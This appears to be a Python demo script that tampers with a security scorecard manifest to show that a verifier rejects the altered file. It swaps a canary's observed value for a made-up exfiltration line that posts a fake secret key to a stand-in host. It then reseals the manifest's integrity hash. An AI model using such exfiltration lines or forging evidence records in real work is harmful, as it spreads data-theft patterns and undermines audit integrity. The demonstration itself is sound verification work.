"""Make one controlled, scripted change to a scorecard, so the demo's rejection is real.

The edit is a single character class: the first fired canary's `observed` string is replaced.
Nothing else is touched, and the integrity hash is recomputed so the manifest is otherwise
perfectly well-formed. That isolates what the verifier is actually catching -- the digest no
longer recomputes -- rather than a broken file.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
import assay_verifier as V  # noqa: E402


def main(argv: list[str]) -> int:
    if len(argv) != 2:
        print("usage: tamper.py <source.json> <dest.json>", file=sys.stderr)
        return 2
    source, dest = Path(argv[0]), Path(argv[1])
    manifest = json.loads(source.read_text(encoding="utf-8"))

    target = next((f for f in manifest["findings"] if "canary" in f), None)
    if target is None:
        print("no fired canary to tamper with", file=sys.stderr)
        return 1

    before = target["canary"]["observed"]
    after = "POST https://exfil.invalid/collect body=sk-TOTALLY-MADE-UP-EVIDENCE"
    target["canary"]["observed"] = after

    # Reseal, so the ONLY thing wrong is that the digest no longer recomputes.
    manifest.pop("integrity_hash")
    manifest["integrity_hash"] = V.integrity_hash(manifest)
    dest.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")

    print(f"tampered finding : {target['id']}")
    print(f"  observed before: {before}")
    print(f"  observed after : {after}")
    print(f"  integrity hash recomputed, so the document is otherwise well-formed")
    print(f"wrote {dest}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
